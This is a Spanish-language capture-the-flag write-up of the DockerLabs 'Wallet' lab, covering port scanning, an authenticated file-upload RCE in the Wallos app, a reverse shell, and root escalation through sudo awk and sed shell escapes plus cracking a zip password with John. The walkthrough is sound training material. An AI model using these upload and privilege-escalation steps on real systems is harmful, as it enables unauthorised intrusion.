---
layout: post
title: DockerLabs Wallet Writeup
date: 2024-09-10
categories: ["Writeup", "Linux", "DockerLabs"]
---

![Image 1](https://dockerlabs.es/images/logos/wallet.jpeg)

# Enumeración

Iniciamos el proceso de enumeración ejecutando el siguiente comando con `nmap`:

```python
❯ nmap -p- --open --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 13:50 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00013s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.63 seconds

```

Como vemos solo esta el puerto 80 abierto. Vamos a lanzar el siguiente scaneo de `nmap` sobre el puerto 80, esta vez con scripts básicos de `enumeración de servicios` y `versiones`:

```python
❯ nmap -sCV -p80 -Pn 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 13:54 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Wallet

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds

```

Echándole un ojo a la web no vemos nada interesante, pero mirando el código fuente vemos que hace referencia a un `subdominio`:

![Image 2](/screenshots/wallet/html_domain.png)

Lo añadimos a nuestro archivo `/etc/hosts` así como el dominio `wallet.dl`

Entrando al subdminio `panel.wallet.dl` vemos que nos carga un formulario para registrarnos, nos registramos y accedemos a una aplicación web llamada `wallos`. Wallos es una aplicación web open source destinada a gestionar tus finanzas de una manera más fácil y efectiva. En la sección `About and Credits` podemos ver la versión utilizada:

![Image 3](/screenshots/wallet/wallos.png)

# Intrusión

Si buscamos por vulnerabilidades de wallos, nos encontramos con un `Authenticated RCE` en versiones anteriores a la 1.11.2 ([Link al PoC](https://www.exploit-db.com/exploits/51924))

A la hora de crear una nueva suscripción, el usuario puedes subir una imagen/logo, pero el código no está sanitizado correctamente y un usuario mal intencionado puede fácilmente bypassear la comprobación y subir una "imagen" con código php.

![Image 4](/screenshots/wallet/burpsuite.png)

Nuestra shell se guarda en `images/uploads/logos/`, nos dirigimos allí y nos enviamos una reverse shell a nuestra máquina

![Image 5](/screenshots/wallet/webshell.png)

![Image 6](/screenshots/wallet/netcat.png)

# Escalada

Primero vamos a cambiarnos a una shell completamente interactiva de la siguiente manera:

```bash
script /dev/null -c bash
ctrl + z 
stty raw -echo;fg 
reset xterm
export TERM=xterm 
export SHELL=/bin/bash
stty rows 41 columns 184
```

Mirando el archivo `/etc/passwd` vemos que hay 2 usuarios, `Pylon` y `Mario`

![Image 7](/screenshots/wallet/users.png)

Con `sudo -l` vemos que podemos ejecutar el comando `awk` como pylon sin proporcionar contraseña 

![Image 8](/screenshots/wallet/sudo.png) 

```bash 
sudo -u pylon /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

Una vez estamos como Pylon, vemos que hay un comprimido `.zip`, al descomprimirlo nos pide una contraseña 

![Image 9](/screenshots/wallet/zip.png) 

Para extraer el hash y romperlo voy a usar `zip2john`, pero antes tengo que pasarme el archivo a mi máquina. La máquina víctima no tiene python, asi que usare `php` para exponer el archivo y descargarlo a mi máquina. 

```php
// Máquina víctima 
php -S 0.0.0.0:81
```

```php
// Mi máquina
wget http://172.17.0.2:81/secretitotraviesito.zip
```
Para extraer el hash y romperlo con john ejecuté los siguientes comandos:

```bash 
❯ zip2john secretitotraviesito.zip > hash
```

```python
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate1       (secretitotraviesito.zip/notitachingona.txt)     
1g 0:00:00:00 DONE (2024-09-10 20:27) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Descomprimimos el zip y el contenido es la contraseña para el usuario `pinguino`

![Image 10](/screenshots/wallet/pinguino.png)

El usuario `pinguino` puede ejcutar como cualquier usuario el comando sed sin proporcionar contraseña 

![Image 11](/screenshots/wallet/sudo_root.png)

```python 
sudo /usr/bin/sed -n '1e exec /bin/bash 1>&0' /etc/hosts
```

![Image 12](/screenshots/wallet/rooted.png)

